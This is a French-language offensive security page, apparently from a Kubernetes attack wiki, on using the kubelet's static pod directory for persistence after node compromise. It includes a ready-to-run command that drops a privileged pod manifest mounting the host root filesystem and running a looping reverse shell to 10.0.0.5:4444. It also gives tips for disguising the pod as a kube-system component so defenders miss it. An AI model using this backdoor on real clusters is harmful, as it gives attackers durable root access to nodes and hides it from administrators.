---
order: 5
title: "Static pods : des pods que le kubelet exécute depuis un répertoire de manifestes du nœud"
description: "Le kubelet exécute tout manifeste de pod placé dans son répertoire de static pods (généralement /etc/kubernetes/manifests), directement et sans l'API server. Un attaquant disposant d'un accès aux fichiers du nœud y dépose un manifeste pour un pod backdoor privilégié que le kubelet démarre et maintient en vie, sans objet API correspondant qu'un défenseur puisse voir ou supprimer via kubectl."
keywords:
  - static pod
  - manifestes kubelet
  - persistance sur le nœud
  - mirror pod
  - backdoor
---

# Static pods

Le kubelet surveille un répertoire local, généralement `/etc/kubernetes/manifests`, et exécute directement tout manifeste de pod qu'il y trouve, indépendamment de l'API server et du scheduler. Ces static pods sont la façon dont les composants du control plane s'exécutent eux-mêmes. Un attaquant capable d'écrire dans ce répertoire sur un nœud (après une compromission du nœud) y dépose un manifeste pour un pod backdoor privilégié ; le kubelet le démarre et le redémarre s'il meurt. L'API server n'affiche qu'un mirror pod en lecture seule, et supprimer ce mirror via l'API ne retire pas le static pod, que le kubelet recrée immédiatement à partir du manifeste présent sur le disque.

Nécessite un accès en écriture au répertoire de manifestes du nœud :

```bash
ls -l /etc/kubernetes/manifests/              # the static pod directory
# the path is the kubelet's --pod-manifest-path / staticPodPath; confirm from its config
grep -i staticPodPath /var/lib/kubelet/config.yaml 2>/dev/null
```

## Déposer un manifeste backdoor

```bash
cat > /etc/kubernetes/manifests/kube-proxy-metrics.yaml <<'YAML'
apiVersion: v1
kind: Pod
metadata: { name: kube-proxy-metrics, namespace: kube-system }
spec:
  hostNetwork: true
  hostPID: true
  containers:
  - name: c
    image: alpine
    command: ["/bin/sh","-c","while :; do sh -i >& /dev/tcp/10.0.0.5/4444 0>&1; sleep 60; done"]
    securityContext: { privileged: true }
    volumeMounts: [{ name: h, mountPath: /host }]
  volumes: [{ name: h, hostPath: { path: / } }]
YAML
# the kubelet starts it within seconds; no API create was needed
```

## Notes d'exploitation

- Le static pod n'a pas de véritable objet API : `kubectl delete` ne supprime que le mirror, et le kubelet recrée le pod à partir du manifeste, de sorte que la persistance survit à un nettoyage au niveau de l'API jusqu'à ce que le fichier soit retiré du nœud.
- Il nécessite un accès aux fichiers du nœud, il s'enchaîne donc après une compromission du nœud ([Évasion de pod vers le nœud](../pod-escape-to-node/index.md)) ; c'est un moyen de conserver durablement cet ancrage sur le nœud.
- Nommez le manifeste et le pod pour qu'ils ressemblent à un composant du control plane dans `kube-system`, où les static pods sont attendus, afin de ne pas vous démarquer parmi les légitimes.
- Privilégié plus hostPath fait aussi de la backdoor un ancrage complet sur le nœud à chaque redémarrage.

## Références

- [Kubernetes: static pods](https://kubernetes.io/docs/tasks/configure-pod-container/static-pod/)
- [Microsoft: Kubernetes threat matrix (persistence)](https://www.microsoft.com/en-us/security/blog/2021/03/23/secure-containerized-environments-with-updated-threat-matrix-for-kubernetes/)
